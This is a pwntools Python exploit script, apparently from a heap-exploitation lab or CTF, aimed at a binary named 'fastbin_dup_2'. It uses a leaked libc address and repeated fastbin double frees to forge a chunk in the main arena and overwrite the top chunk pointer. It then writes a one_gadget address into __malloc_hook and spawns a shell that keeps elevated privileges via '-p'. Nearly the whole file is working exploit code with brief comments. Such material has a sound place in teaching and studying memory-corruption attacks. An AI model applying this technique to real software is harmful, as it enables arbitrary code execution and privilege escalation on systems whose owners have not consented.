#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# ===== Writing the size field into the main arena =====

# Allocate 0x50-sized chunks
chunk_A = malloc(0x48, "A"*8)
chunk_B = malloc(0x48, "B"*8)

# Trigger double-free bug
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Overwrite a fastbin fd with a fake size field
malloc(0x48, p64(0x61))

# Request B and A chunks, writing the fake size field into the main arena
malloc(0x48, "C"*8)
malloc(0x48, "D"*8)

# ===== Linking the fake chunk =====

# Allocate 0x60-sized chunks
chunk_A = malloc(0x58, "K"*8)
chunk_B = malloc(0x58, "L"*8)

# Trigger double-free bug
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Link the fake chunk
malloc(0x58, p64(libc.sym.main_arena + 0x20))

# Request B and A chunks, moving the fake chunk to the head
malloc(0x58, b"-p\x00") # sh's argv[1] (don't reset euid)
malloc(0x58, b"-s\x00") # sh's argv[2] (ignore succeeding junk in the stack)

# ===== Overwriting the top chunk pointer =====
malloc(0x58, b"Y"*48 + p64(libc.sym.__malloc_hook - 0x23))

# ===== Overwriting the __malloc_hook with one_gadget =====
malloc(0x28, b"\x00" * 0x13 + p64(libc.address + 0xe1fa1))

# ===== Calling one_gadget =====
malloc(0x28, "")

io.interactive()
